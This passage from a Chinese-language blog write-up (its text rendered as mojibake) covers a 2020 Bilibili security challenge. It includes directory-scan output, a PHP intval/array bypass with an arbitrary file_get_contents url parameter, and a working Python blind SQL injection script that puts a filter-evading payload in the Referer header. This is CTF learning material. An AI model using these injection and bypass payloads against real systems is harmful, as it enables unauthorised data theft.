<span class=go>[REDACTED] Starting: blog/</span>
<span class=go>[REDACTED] 301 -  313B  - /blog/js  ->  http://45.113.201.36/blog/js/</span>
<span class=go>[REDACTED] 403 -  298B  - /blog/.htaccess.bak1</span>
<span class=go>[REDACTED] 403 -  298B  - /blog/.htaccess.orig</span>
<span class=go>[REDACTED] 403 -  300B  - /blog/.htaccess.sample</span>
<span class=go>[REDACTED] 403 -  298B  - /blog/.htaccess.save</span>
<span class=go>[REDACTED] 403 -  296B  - /blog/.htaccessBAK</span>
<span class=go>[REDACTED] 403 -  296B  - /blog/.htaccessOLD</span>
<span class=go>[REDACTED] 403 -  289B  - /blog/.html</span>
<span class=go>[REDACTED] 403 -  288B  - /blog/.htm</span>
<span class=go>[REDACTED] 403 -  297B  - /blog/.htaccessOLD2</span>
<span class=go>[REDACTED] 403 -  295B  - /blog/.httr-oauth</span>
<span class=go>[REDACTED] 403 -  288B  - /blog/.php</span>
<span class=go>[REDACTED] 403 -  289B  - /blog/.php3</span>
<span class=go>[REDACTED] 301 -  314B  - /blog/css  ->  http://45.113.201.36/blog/css/</span>
<span class=hll><span class=go>[REDACTED] 200 -   66KB - /blog/test.php</span>
</span><span class=go>[REDACTED] Starting: console/</span>
<span class=go>[REDACTED] 301 -  185B  - /console/css  ->  http://45.113.201.36/console/css/</span>
<span class=go>[REDACTED] Starting: css/</span>

<span class=go>Task Completed</span>
</pre></div> <p>é‡è¦çš„å‡ è¡Œéƒ½é«˜äº®äº†å‡ºæ¥ã€‚</p> <p>æ—¢ç„¶æœ‰å¼€ redis çš„ç«¯å£ï¼Œé‚£å°±è¯•ç€è¿ä¸€ä¸‹ï¼Œå‘ç°ä¸éœ€è¦å¯†ç ã€‚ç”¨ <code>KEYS *</code> çœ‹äº†ä¸€ä¸‹ï¼Œé‡Œé¢ä¸€å † flagï¼Œæ¯ä¸ªéƒ½è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰ç¬¬ 8 é¢˜çš„æ˜¯å¯¹çš„ï¼Œå‰©ä¸‹çš„ä¼°è®¡éƒ½æ˜¯åˆ«äººè‡ªå·±åŠ è¿›å»çš„ã€‚åˆå°è¯•æ‰¾æ‰¾ redis é‡Œæœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–çº¿ç´¢ï¼Œä½†å‘ç°è¿™ä¸ªæœåŠ¡ç«¯å°±æ˜¯ä¸ªæ— æƒ…çš„ <span class=caps>OK</span> æœºå™¨ï¼Œé™¤äº†å‡ ä¸ªæœ€åŸºæœ¬çš„å¢åˆ æ”¹æŸ¥çš„å‘½ä»¤å¤–ï¼Œå‘ä»€ä¹ˆéƒ½å› <span class=caps>OK</span> ğŸ˜‚ã€‚è¿™æ ·çœ‹æ¥ redis çš„è¿™ä¸ªç«¯å£åªèƒ½ç”¨æ¥è§£ç¬¬ 8Â é¢˜äº†ã€‚</p> <p>ç„¶åå¯ä»¥å‘ç°æ‰«ç›®å½•æ‰«å‡ºäº†ä¸ª <code>/blog/test.php</code>ï¼Œè¿›å»å‘ç°å…¨æ˜¯å„ç§ <code>!+()[]{}</code> ä¹‹ç±»çš„å¥‡æ€ªç¬¦å·ï¼ŒæŸ¥äº†ä¸€ä¸‹æ‰çŸ¥é“æ˜¯ JsFuckã€‚ç”¨ <a href=http://codertab.com/JsUnFuck rel=noreferrer target=_blank>JsUnFuck</a>Â è§£å¯†ä¸€ä¸‹åå‘ç°æ˜¯è¿™æ ·ä¸€æ®µä»£ç ï¼š</p> <div class=highlight><pre><span></span><span class=kd>var</span> <span class=nx>str1</span> <span class=o>=</span> <span class=s2>"\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9"</span><span class=p>;</span>
<span class=kd>var</span> <span class=nx>str2</span> <span class=o>=</span> <span class=s2>"bilibili1024havefun"</span><span class=p>;</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>()</span>
</pre></div> <p>å…¶ä¸­ <code>str1</code> æ˜¯ <code>ç¨‹åºå‘˜æœ€å¤šçš„åœ°æ–¹</code>ï¼Œå¾ˆå®¹æ˜“çŒœåˆ°æŒ‡ Githubã€‚ä¸Š Github æœäº†ä¸€ä¸‹ <code>bilibili1024havefun</code>ï¼Œå‘ç°äº† <a href=https://github.com/interesting-1024/end rel=noreferrer target=_blank>interesting-1024/end</a>ã€‚ä¸€å…±ä¸¤ä¸ª commitï¼Œéƒ½æ˜¯ç›´æ¥åœ¨ç½‘é¡µä¸Šæäº¤çš„ï¼Œé‚®ç®±ä¹Ÿç”¨çš„æ˜¯ Github çš„ <a class=m-footnote href=#id12 id=id9>2</a>ã€‚åªæœ‰ <a class=m-link-wrap href=https://github.com/interesting-1024/end/tree/main/end.php rel=noreferrer target=_blank>https://github.com/interesting-1024/end/tree/main/end.php</a>Â è¿™ä¸ªæ–‡ä»¶æœ‰ç”¨ï¼š</p> <table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div><td class=code><div class=highlight><pre><span></span><span class=cp>&lt;?php</span>

<span class=c1>//filename end.php</span>

<span class=nv>$bilibili</span> <span class=o>=</span> <span class=s2>"bilibili1024havefun"</span><span class=p>;</span>

<span class=hll><span class=nv>$str</span> <span class=o>=</span> <span class=nb>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>'id'</span><span class=p>]);</span>
</span><span class=nv>$reg</span> <span class=o>=</span> <span class=nb>preg_match</span><span class=p>(</span><span class=s1>'/\d/is'</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>'id'</span><span class=p>]);</span>

<span class=hll><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nb>is_numeric</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>'id'</span><span class=p>])</span> <span class=k>and</span> <span class=nv>$reg</span> <span class=o>!==</span> <span class=mi>1</span> <span class=k>and</span> <span class=nv>$str</span> <span class=o>===</span> <span class=mi>1</span><span class=p>){</span>
</span><span class=hll>    <span class=nv>$content</span> <span class=o>=</span> <span class=nb>file_get_contents</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>'url'</span><span class=p>]);</span>
</span>
<span class=hll>    <span class=c1>//æ–‡ä»¶è·¯å¾„çŒœè§£</span>
</span>    <span class=k>if</span> <span class=p>(</span><span class=k>false</span><span class=p>){</span>
        <span class=k>echo</span> <span class=s2>"è¿˜å·®ä¸€ç‚¹ç‚¹å•¦ï½"</span><span class=p>;</span>
    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span><span class=k>else</span><span class=p>{</span>
    <span class=k>echo</span> <span class=s2>"ä½ æƒ³è¦çš„ä¸åœ¨è¿™å„¿ï½"</span><span class=p>;</span>
<span class=p>}</span>
<span class=cp>?></span><span class=x></span>
</pre></div> </table><p>ç¬¬ 7 è¡Œå’Œç¬¬ 10 è¡Œä¸­çš„ <code>!is_numeric($_GET['id'])</code> å¯ä»¥çœ‹å‡ºï¼Œ<code>id</code> ä¸èƒ½æ˜¯æ•°å­—ï¼Œä½†å¿…é¡»èƒ½è¢« <code>intval</code> è½¬æ¢æˆ <code>1</code>ï¼Œå› æ­¤ <code>id</code> å¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚åŒæ—¶ä»ç¬¬ 11 è¡Œå¯ä»¥çœ‹å‡ºè¿˜éœ€è¦ä¸€ä¸ª <code>url</code> å‚æ•°ï¼Œå†ç»“åˆç¬¬ 13 è¡Œï¼Œå¯ä»¥çœ‹å‡ºè¦çŒœè·¯å¾„ã€‚<s>æœ€è®¨åŒçš„çŒœè°œæ—¶é—´ğŸ¤¦â€â™‚ï¸</s>ã€‚çŒœäº†å„ç§è·¯å¾„åï¼Œå‘ç°æ˜¯ä»»æ„å­—ç¬¦ + <code>flag.txt</code>ï¼Œå¦‚ <code>xflag.txt</code> <a class=m-footnote href=#id13 id=id10>3</a>ã€‚æœ€åæ‹¼å‡ºæ¥çš„è·¯å¾„æ˜¯:</p> <pre>http://45.113.201.36/blog/end.php?id[]=1&url=xflag.txt</pre> <p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚å›¾ç‰‡ä¸Šæ²¡ä»€ä¹ˆä¿¡æ¯ï¼Œç”¨ <code>hexdump</code> å¯ä»¥å‘ç°æ–‡ä»¶æœ€åæœ‰Â flag10ï¼š</p> <div class=highlight><pre><span></span><span class=gp>$</span> hd bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg

<span class=go>[TRUNCATED]</span>

<span class=go>00008f90  8a 28 00 a2 8a 28 03 ff  d9 7b 7b 66 6c 61 67 31  |.(...(...{{flag1|</span>
<span class=go>00008fa0  30 3a 32 65 62 64 33 62  30 38 2d 34 37 66 66 63  |0:2ebd3b08-47ffc|</span>
<span class=go>00008fb0  34 37 38 2d 62 34 39 61  35 66 39 64 2d 66 36 30  |478-b49a5f9d-f60|</span>
<span class=go>00008fc0  39 39 64 36 35 7d 7d                              |99d65}}|</span>
<span class=go>00008fc7</span>
</pre></div> <p>åŒæ—¶å›¾ç‰‡æ–‡ä»¶åçš„ä¸­é—´é‚£æ®µåº”è¯¥ä¹Ÿæ˜¯ md5ï¼Œä½†å¹¶ä¸æ˜¯å›¾ç‰‡çš„ md5ï¼Œä¹Ÿæ‰¾ä¸å‡ºæ˜¯ä»€ä¹ˆçš„ md5ï¼Œå°è¯•ç”¨ <code>hashcat</code> æš´åŠ›ç ´è§£ï¼Œ8Â ä½ä¹‹å†…å¹¶æ²¡æœ‰ç ´è§£å‡ºæ¥ã€‚</p> <p>å†å›åˆ°ä¹‹å‰çš„ <code>dirsearch</code> çš„ç»“æœã€‚å¯ä»¥çœ‹å‡ºæœ‰ä¸€ä¸ª <code>console</code> è·¯å¾„å’Œå„ç§é…ç½®æ–‡ä»¶ä¼šè¿”å› 403ã€‚ç»æ‰‹åŠ¨æµ‹è¯•å‘ç°åªæœ‰ä»¥æŸäº›å­—æ¯å¼€å¤´çš„é…ç½®æ–‡ä»¶ä¼šè¿”å› 403ï¼Œå¦‚ <code>/blog/.htaccess1</code> å°±è¿”å›çš„æ˜¯ 403ï¼Œè€Œ <code>/blog/.bashrc</code> è¿”å›çš„åˆ™æ˜¯Â 404ã€‚</p> <p>åˆ°è¿™é‡Œå°±æ²¡æœ‰å…¶ä»–çš„å‘ç°äº†ï¼Œä¹Ÿä¸çŸ¥é“å¦‚ä½•ç»§ç»­è§£ä¸‹å»ã€‚è¿˜æœ‰ä¸€å †ä½œä¸šè¦åšï¼Œå°±ä¸ç»§ç»­æƒ³ä¸‹å»äº†ğŸ¤¦â€â™‚ï¸ã€‚</p> <hr> <p>æœ¬æ¥æ‰“ç®—å†™åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œä½†æˆ‘åœ¨ä¹‹å‰çš„ <a href=https://github.com/interesting-1024/end/issues/283 rel=noreferrer target=_blank>é‚£ä¸ªä»£ç åº“é‡Œçš„ä¸€ä¸ª issue ä¸­</a> æ‰¾åˆ°äº†ç¬¬ 6Â é¢˜çš„ç­”æ¡ˆï¼›è™½ç„¶ä¸æ˜¯è‡ªå·±åšçš„ï¼Œä½†ä¹Ÿåœ¨è¿™é‡Œå†™ä¸€ä¸‹ã€‚</p> <p>ç¬¬å…­é¢˜é€šè¿‡ Referer æ³¨å…¥ï¼Œå¯ä»¥æ”¹å˜é¡µé¢ä¸Šæ˜¾ç¤ºçš„å†…å®¹ã€‚é€šè¿‡äºŒåˆ†æŸ¥æ‰¾ç¡®å®šé¡µé¢æœ€æ—©å¼€å§‹å˜åŒ–çš„æ•°å­—ï¼Œç„¶åæŠŠæ¯ä¸€ä½çš„æ•°å­—è½¬æ¢æˆå¯¹åº”çš„ Unicode å­—ç¬¦ï¼Œå°±èƒ½å¾—åˆ°ç¬¬å…­é¢˜çš„Â flagã€‚</p> <p>Issue ä¸­æœ‰æä¾›è„šæœ¬ï¼Œä½†ä»£ç é£æ ¼æ„Ÿäººï¼ŒåŒæ—¶ Python 3Â è¿è¡Œä¼šæŠ¥é”™ï¼Œè¿™é‡Œå†æä¾›ä¸€ä¸ªæˆ‘ä¿®æ”¹è¿‡çš„ç‰ˆæœ¬ï¼š</p> <div class=highlight><pre><span></span><span class=kn>import</span> <span class=nn>requests</span>

<span class=n>URL</span> <span class=o>=</span> <span class=s1>'http://45.113.201.36/blog/single.php?id=1'</span>


<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
    <span class=n>flag</span> <span class=o>=</span> <span class=p>[]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
        <span class=n>left</span><span class=p>,</span> <span class=n>right</span> <span class=o>=</span> <span class=mi>33</span><span class=p>,</span> <span class=mi>128</span>
        <span class=k>while</span> <span class=n>right</span> <span class=o>-</span> <span class=n>left</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
            <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>left</span> <span class=o>+</span> <span class=n>right</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
            <span class=n>payload</span> <span class=o>=</span> <span class=p>(</span><span class=sa>f</span><span class=s2>"0123'^if(substr((selselectect flag from flag),</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>,1)>"</span>
                       <span class=sa>f</span><span class=s2>"binary </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span><span class=si>}</span><span class=s2>,(selecselectt 1+~0),0) "</span>
                       <span class=sa>f</span><span class=s2>"ununionion selecselectt 1,2#"</span><span class=p>)</span>
            <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>'Referer'</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span> <span class=o>==</span> <span class=mi>5596</span><span class=p>:</span>
                <span class=n>left</span> <span class=o>=</span> <span class=n>mid</span>
            <span class=k>else</span><span class=p>:</span>
                <span class=n>right</span> <span class=o>=</span> <span class=n>mid</span>
        <span class=nb>print</span><span class=p>(</span><span class=n>right</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>' '</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
        <span class=n>flag</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>right</span><span class=p>))</span>
    <span class=nb>print</span><span class=p>()</span>
    <span class=nb>print</span><span class=p>(</span><span class=s1>''</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>'__main__'</span><span class=p>:</span>
    <span class=n>main</span><span class=p>()</span>
</pre></div> <p>è¿è¡Œè¾“å‡ºå¦‚ä¸‹:</p> <pre>97 50 98 48 56 56 51 99 45 102 102 98 98 56 100 49 55 45 57 97 51 98 98 102 49 99 45 101 100 54 48 48 99 56 48 34 34 34 34 34 34 34 34 34 34 34 34 34 34
a2b0883c-ffbb8d17-9a3bbf1c-ed600c80"""""""""""""""""""""""""""""""""</pre> <p>å…¶ä¸­ <code>a2b0883c-ffbb8d17-9a3bbf1c-ed600c80</code> å°±æ˜¯ç¬¬å…­é¢˜çš„ç­”æ¡ˆã€‚</p> <hr> <dl class=m-footnote> <dt id=id11>1.</dt> <dd><span class=m-footnote><a href=#id4>^</a></span> å…¶ä¸­ç¬¬ä¸€å¤„çš„ <code>&lt;meta></code> æ ‡ç­¾æˆ‘åæ¥å‘ç°æ¯ä¸€é¢˜çš„é¡µé¢ä¸­éƒ½å­˜åœ¨ğŸ¤£ã€‚</dd> <dt id=id12>2.</dt> <dd><span class=m-footnote><a href=#id9>^</a></span> <code>interesting-1024 &lt;73268425+interesting-1024@users.noreply.github.com></code></dd> <dt id=id13>3.</dt> <dd><span class=m-footnote><a href=#id10>^</a></span> ä¸èƒ½ç”¨ <code>flag.txt</code>ã€‚</dd> </dl> </section> </div> <div class="alert alert-secondary" id=license> <div class=mb-3 id=license-meta> <h2 id=license-title>Bç«™å®‰å…¨æŒ‘æˆ˜èµ›è§£ç­”è¿‡ç¨‹è®°å½•</h2> <div id=meta-url><a href=https://shniubobo.xyz/article/bilibili-1024.html class=text-muted>https://shniubobo.xyz/article/bilibili-1024.html</a></div> <div class="d-flex flex-wrap mt-3"> <div class="meta-kv flex-grow-1 flex-sm-grow-0"> <div class=meta-key>ä½œè€…</div> <div class=meta-value>shniubobo</div> </div> <div class=meta-kv> <div class="meta-key text-right text-sm-left">å‘å¸ƒæ—¥æœŸ</div> <div class=meta-value>2020-10-25</div> </div> <div class="flex-linebreak d-sm-none mb-1"></div> <div class="meta-kv flex-grow-1 flex-sm-grow-0"> <div class=meta-key>æœ€åä¿®æ”¹æ—¥æœŸ</div> <div class=meta-value>2020-10-26</div> </div> <div class=meta-kv> <div class="meta-key text-right text-sm-left">è®¸å¯åè®®</div> <div class=meta-value><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noreferrer>CC BY-NC-SA 4.0</a></div> </div> </div> </div> <div id=license-notice>è½¬è½½æˆ–å¼•ç”¨æœ¬æ–‡æ—¶è¯·éµå®ˆè®¸å¯åè®®ï¼Œæ³¨æ˜å‡ºå¤„ï¼Œä»¥ç›¸åŒæ–¹å¼å‘å¸ƒï¼Œä¸”ä¸å¾—å•†ç”¨ï¼</div> </div> <div class="d-flex mb-n1 mb-sm-n3 user-select-none" id=neighbours> <a href=https://shniubobo.xyz/article/hello-world.html class="neighbour-item d-flex align-items-center"> <svg class="icon icon-neighbour icon-prev mr-3"><use xlink:href=#icon-next></use></svg> <div> <div class=neighbour>ä¸Šä¸€ç¯‡</div> <div>Hello,Â world!</div> </div> </a> <div class=flex-grow-1></div> <div class="text-muted text-right neighbour-item d-flex align-items-center"> <div> <div class=neighbour>ä¸‹ä¸€ç¯‡</div> <div>æ— </div> </div> <svg class="icon icon-neighbour icon-next ml-3"><use xlink:href=#icon-next></use></svg> </div> </div> </article> </div> <div class="col-md col-12 pl-md-0 pr-lg-0"> <div class="border-0 card text-center" id=profile-card> <img src=https://shniubobo.xyz/static/avatar.jpg alt=Avatar class="rounded-circle img-thumbnail mx-auto mb-2" id=avatar> <div id=name class=mb-1>shniubobo</div> <p class="mb-2 d-block d-md-none d-lg-block">ä»æœªåœæ­¢æ€è€ƒ</p> <div class="container col-xl-8 col-md-12 col-sm-4 col-6"> <div class="row row-cols-2 mb-0 pl-0"> <div class="col px-0"><a class="d-inline-block social-icon" href=https://github.com/shniubobo target=_blank rel=noreferrer><svg class=icon><use xlink:href=#icon-github></use></svg></a></div> <div class="col px-0"><a class="d-inline-block social-icon" href=https://steamcommunity.com/id/shniubobo/ target=_blank rel=noreferrer><svg class=icon><use xlink:href=#icon-steam></use></svg></a></div> </div> </div> </div> </div> </div> </div> <footer lang=en class=mt-auto> <div class="container-lg container-fluid col-xxl-6 my-3 px-lg-0 d-md-flex text-muted text-md-left text-center"> <div class=flex-grow-1>Copyright Â© 2020 shniubobo</div> <div> <span class="d-block d-sm-inline">Powered by <a class=link-text href=https://github.com/getpelican/pelican target=_blank rel=noreferrer>Pelican</a></span><span class="dot d-none d-sm-inline"></span><span>Made by <a class=link-text href=https://shniubobo.xyz/about.html>shniubobo</a> with <span class=coffee></span></span> </div> </div> </footer> <script src=//at.alicdn.com/t/font_2112932_q7g9e3n630l.js crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.min.js integrity="sha256-ecWZ3XYM7AwWIaGvSdmipJ2l1F4bN9RXW6zgpeAiZYI=" crossorigin=anonymous></script> 